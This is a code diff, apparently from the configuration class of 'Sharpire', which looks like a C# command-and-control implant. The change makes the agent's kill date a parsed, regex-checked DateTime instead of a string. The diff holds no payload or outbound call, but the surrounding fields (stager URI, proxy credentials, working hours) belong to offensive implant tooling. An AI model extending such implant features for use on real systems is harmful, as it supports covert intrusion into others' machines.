@@ -46,7 +46,7 @@ namespace Sharpire
         private string StagerURI;
         private string Proxy;
         private string ProxyCreds;
-        private string KillDate;
+        private DateTime KillDate;
         private DateTime WorkingHoursStart;
         private DateTime WorkingHoursEnd;
         private string AgentID;
@@ -88,7 +88,16 @@ namespace Sharpire
             StagerURI = ConfigurationManager.AppSettings["StagerURI"];
             Proxy = ConfigurationManager.AppSettings["Proxy"];
             ProxyCreds = ConfigurationManager.AppSettings["ProxyCreds"];
-            KillDate = ConfigurationManager.AppSettings["KillDate"];
+
+            string KillDate = ConfigurationManager.AppSettings["KillDate"];
+            if (!string.IsNullOrEmpty(KillDate))
+            {
+                Regex regex = new Regex("^\\d{1,2}\\/\\d{1,2}\\/\\d{4}$");
+
+                if (regex.Match(KillDate).Success)
+                    DateTime.TryParse(KillDate, out this.KillDate);
+            }
+
             string WorkingHours = ConfigurationManager.AppSettings["WorkingHours"];
             if (!string.IsNullOrEmpty(WorkingHours))
             {
@@ -119,7 +128,7 @@ namespace Sharpire
         public string GetStagerURI() { return StagerURI; }
         public string GetProxy() { return Proxy; }
         public string GetProxyCreds() { return ProxyCreds; }
-        public string GetKillDate() { return KillDate; }
+        public DateTime GetKillDate() { return KillDate; }
 
         public void SetWorkingHoursStart(DateTime WorkingHoursStart)
         {
